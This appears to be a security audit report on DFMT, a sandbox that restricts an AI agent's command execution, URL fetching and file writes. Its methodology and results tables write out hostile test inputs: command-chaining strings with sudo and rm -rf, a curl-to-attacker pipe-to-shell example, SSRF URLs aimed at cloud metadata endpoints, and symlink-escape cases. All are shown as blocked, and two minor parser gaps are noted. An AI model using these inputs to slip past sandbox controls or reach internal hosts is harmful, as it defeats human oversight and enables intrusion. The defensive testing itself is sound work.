# sc-business-logic Results

## Target: DFMT sandbox-policy bypass + intent-contract violations

## Methodology

Per the engagement brief, focused on policy-bypass patterns:

1. Argv-splitting tricks against `dfmt_exec`: `;`, `&&`, `||`, `&`, `|`,
   backticks, `$(…)`, `<<`, `>` redirections.
2. Allow-list prefix-match abuse: `git ` matching `git-shell`, `git-receive-pack`.
3. SSRF bypass for `dfmt_fetch`: DNS rebinding, IPv6 mapping
   (`::ffff:169.254.169.254`), URL-parser quirks
   (`http://127.0.0.1#@evil`, userinfo, percent-encoding).
4. `dfmt_write` symlink escape despite `safefs.CheckNoSymlinks`.
5. Information leakage via `/api/daemons` and `/api/stats`.
6. Wire-dedup correctness across sessions (could a second agent see
   another's content_id and be told "(unchanged)")?
7. Policy-rule normalization edge cases (Windows backslash paths,
   case-folding, URL scheme casing).

Walked the relevant code in `internal/sandbox/permissions.go`,
`internal/safefs/safefs.go`, and `internal/transport/handlers.go`.

## Findings

### sc-business-logic-01 — Allow-list prefix match: `git`/`git *` does NOT match `git-shell`, but base-extraction lets unbalanced subcommand names sneak through

- **Severity:** Info (defense-in-depth — not exploitable on the default policy)
- **CWE:** CWE-697 (Incorrect Comparison)
- **File:** `internal/sandbox/permissions.go:312-358,609-632`
- **Description:** `globMatch` for op="exec" compiles `^pattern$` with `*`
  → `.*`, so the rule `git` matches the literal string `git` and `git *`
  matches `git ` followed by anything. `git-shell` would match neither
  (`git-shell` does not equal `git` and does not start with `git ` —
  the trailing space is part of the rule). Confirmed safe. **However**,
  `extractBaseCommand` strips a `.exe` suffix case-insensitively and
  splits on the first unquoted whitespace — it does NOT split on `-`.
  So `git-shell` becomes its own base; the `git` allow rule does not
  match it (no rule matches → deny under non-empty allow list).
  Verified by code reading: there is no exploitable prefix-match.
- **Attack scenario:** None. Recorded as Info because future maintainers
  might add a prefix-glob rule like `git*` (no space), which *would*
  match `git-shell`. The current policy has only `git` and `git *`.
- **Remediation:** Add a regression test asserting that `git-shell`,
  `git-receive-pack`, `gitlab` are denied under `DefaultPolicy`. Comment
  in `DefaultPolicy()` warning maintainers not to introduce
  trailing-glob rules without a deny-list cross-check.
- **Confidence:** High that the current policy is safe; Medium that a
  future rule edit would catch a regression without a test.

### sc-business-logic-02 — `splitByShellOperators` does not split on `()` subshell grouping

- **Severity:** Low
- **CWE:** CWE-77 (Improper Neutralization of Special Elements used in a Command)
- **File:** `internal/sandbox/permissions.go:797-954`
- **Description:** The shell-chain splitter recognises `&&`, `||`, `&`,
  `|`, `;`, `>`, `<`, `\n`, `$()`, backticks, and double-quote-internal
  `$()`/backtick. It does **not** split on bare `(...)` subshell
  grouping. A command like `(curl http://attacker | sh)` would be
  treated as a single part with base `(curl`, which fails
  `extractBaseCommand` lookup → deny, so it is safe today. But a
  contrived input like `git log; (sudo whoami)` is split by `;` into
  `git log` and `(sudo whoami)`. The latter's base is `(sudo`, which
  does not match the `sudo *` deny rule (which is anchored at `sudo `).
  The whole-command policy deny check on the second pass
  (`permissions.go:743`) does see `git log; (sudo whoami)` and would
  deny it because the regex match for `sudo *` is unanchored across the
  full command string only when the rule has leading `*` or matching
  position. Verified: `globToRegexShell` produces `^sudo .*$` for the
  rule `sudo *`, anchored — so the full-command match against the
  *cmdForPolicy* string fails. The per-part check fails to match `sudo`
  inside `(sudo whoami)` because the part's base is `(sudo`. Net
  outcome: the agent's call is denied at the per-part allow-list step
  (no rule allows base `(sudo`). Defense-in-depth gap, not exploitable.
- **Attack scenario:** None reproducible. The "no allow rule matches an
  unrecognised base" path catches this. If a future operator adds a
  permissive rule like `*`, the gap would open.
- **Evidence:**
  ```go
  // permissions.go:894 — only these single-char ops split outside quotes
  if c == ';' || c == '|' || c == '>' || c == '<' || c == '\n' { ... }
  // No case for '(' or ')'.
  ```
- **Remediation:** Strip leading `(` from each split part before base
  extraction, OR refuse any command containing `(` not preceded by `$`.
  The simpler fix is to add `(` and `)` to `hasShellChainOperators` and
  `splitByShellOperators` so subshells get the same treatment as
  pipelines.
- **Confidence:** Medium — code reading shows current default policy is
  safe; a permissive overlay or future maintenance could expose it.

### sc-business-logic-03 — `/api/daemons` projectPath comparison is case-sensitive byte-equal

- **Severity:** Info
- **CWE:** CWE-178 (Improper Handling of Case Sensitivity)
- **File:** `internal/transport/http.go:725-735`
- **Description:** The filter compares `d["project_path"] == s.projectPath`
  with `==`. On Windows, two daemon registrations of the same project
  with different drive-letter casing (`C:\proj` vs `c:\proj`) or
  different separator forms would fail to match. This is the *opposite*
  of an info-leak — it is overly strict — and the F-16 fix already
  makes the failure mode "empty list" (fail-closed). Recording for
  awareness.
- **Attack scenario:** None.
- **Remediation:** Optional — normalize via `filepath.Clean` +
  `strings.EqualFold` on Windows before comparing. Not required for
  security.
- **Confidence:** High.

### Verified-clean controls

#### Argv splitting (sandbox-policy bypass)

| Pattern | Result |
|---|---|
| `git status; sudo whoami` | DENY — `;` splits, second part's base `sudo` matches `sudo *` deny |
| `git status && sudo whoami` | DENY — `&&` splits |
| `git status || rm -rf /home` | DENY — `||` splits, `rm` not in allow list |
| `git status & sudo whoami` | DENY — bare `&` (V-1 fix) splits, `sudo` denied |
| `git status \| sudo tee /etc/x` | DENY — `\|` splits |
| `` git status `sudo whoami` `` | DENY — backticks recursed |
| `git status $(sudo whoami)` | DENY — `$(…)` recursed |
| `git "$(sudo whoami)"` | DENY — `$(…)` inside double-quote recursed (defense in depth) |
| `git status > /etc/passwd` | DENY — `>` splits, target write would also fail policy |
| `IFS= sudo whoami` | DENY — env-assignment skipped, real base `sudo` denied |
| `GOCACHE=/tmp go test` | ALLOW — env-assignment recognised, real base `go` allowed |
| `git-shell` | DENY — no allow rule matches the literal token `git-shell` |
| `dfmt remember --tag x` | DENY — `dfmt` and `dfmt *` on deny list (recursive-bypass guard) |

#### SSRF bypass

| Pattern | Result |
|---|---|
| `http://169.254.169.254/latest/meta-data` | DENY — both URL-deny rule (`permissions.go:243-247`) and IP-blocked-range guard (`permissions.go:1149-1168`) fire |
| `http://[::ffff:169.254.169.254]/...` | DENY — `assertFetchURLAllowed` parses the IP, `isBlockedIP` Equal-checks against `169.254.169.254` and Go's `net.IP.Equal` handles 4-in-6 mapping |
| `http://[::1]/...` | DENY — `IsLoopback()` returns true for `::1` |
| `http://127.0.0.1#@evil.com` | DENY — `url.Parse` puts `127.0.0.1` in Hostname, `#@evil.com` is fragment, IP check fires |
| `http://evil.com@127.0.0.1/` | DENY — `Hostname()` returns `127.0.0.1` (userinfo stripped) |
| `https://metadata.google.internal/...` | DENY — case-insensitive hostname literal check (`permissions.go:1116-1119`) plus URL-deny rule |
| `HTTPS://METADATA.GOOGLE.INTERNAL/...` | DENY — `normalizeFetchURLForPolicy` lowercases scheme + host (F-28 fix) |
| `http://attacker.dns-rebind.com/` resolving public-then-internal | DENY — DialContext re-resolves and re-validates inside the transport (`permissions.go:1226-1255`) |
| `file:///etc/passwd` | DENY — both `file://*` deny rule and "unsupported scheme" gate |
| `http://0.0.0.0/...` | DENY — `IsUnspecified()` on the `isBlockedIP` path |

#### `dfmt_write` symlink escape

| Scenario | Result |
|---|---|
| Pre-existing `wd/leak -> /etc/cron.d/x` symlink, agent writes `wd/leak` | DENY — `safefs.CheckNoSymlinks` Lstat-walks each component, sees the symlink at the leaf, returns `ErrSymlinkInPath` (`safefs.go:62-87`) |
| Pre-existing `wd/dir -> /etc`, agent writes `wd/dir/passwd` | DENY — symlink at non-final segment also detected |
| Symlinked parent of *missing* leaf (no target file yet) | DENY — Lstat-walk catches the dir before the missing-leaf branch returns |
| TOCTOU race between Lstat and write | MITIGATED — `WriteFileAtomic` uses tmp + rename; rename(2) replaces the symlink as a directory entry rather than following it (`safefs.go:104-156`); residual race is documented and out of stated threat model |

#### Information leakage via dashboard endpoints

| Endpoint | Leaks? |
|---|---|
| `/api/daemons` | Filtered to caller's project_path with fail-closed default (F-16 fix). When `projectPath == ""` (test or future caller forgot to set it) returns `[]`, not the host-wide registry. (`http.go:721-735`) |
| `/api/stats` | Returns aggregates for the calling daemon's journal only — there is no cross-project query path |
| `/dashboard` | Static HTML; no per-project data inlined |
| `/dashboard.js` | Static JS; no per-project data inlined |

#### Wire-dedup cross-session safety

| Property | Status |
|---|---|
| Cache key includes session ID with NUL separator (collision-safe) | `handlers.go:348-350` |
| HTTP path mints fresh ULID per request when `X-DFMT-Session` absent | `http.go:384-388` |
| Socket path mints per-connection ULID | `socket.go:191-192` |
| MCP path uses per-process ULID with optional clientInfo prefix | `mcp.go:180-184,309-328` |
| Wire-dedup never returns a body from another session because the key includes sessionID | PASS |

#### Intent-contract violations

| Concern | Status |
|---|---|
| Empty `intent` defaulting to "raw" leaks unfiltered output | NO — `ApplyReturnPolicy` enforces approximated-token caps regardless of intent (`internal/sandbox/intent.go`, ADR-0012) |
| Agent passing `Return: "raw"` always gets bytes | YES — by design; agent is opting in, hard caps still apply |
| `dfmt_remember` Source/Priority spoof to land events in P1 | DENIED — server-side override clamps Source=mcp and coerces Priority to {p2,p3,p4}, defaulting non-allowed values to p3 (F-21 fix at `handlers.go:531-545`) |
| `dfmt_write` content body landing in journal verbatim | NO — F-11 fix logs only sha-prefix + byte count (`handlers.go:1631-1641`) |

### Confidence: High on the "no exploitable bypass under default policy"
conclusion. Findings 01 and 02 are defense-in-depth gaps that an
operator's permissive overlay could expose; both are low-cost to harden.
